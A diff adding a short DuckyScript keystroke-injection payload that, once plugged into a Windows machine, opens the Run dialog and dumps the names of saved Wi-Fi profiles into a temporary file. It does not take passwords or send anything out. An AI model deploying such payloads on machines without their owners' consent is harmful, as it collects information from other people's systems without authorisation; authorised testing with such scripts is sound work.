@@ -1,0 +1,6 @@
+REM Windows Saved WiFi Profiles (Names Only)
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c "netsh wlan show profiles > %TEMP%\wifi_profiles.txt"
+ENTER
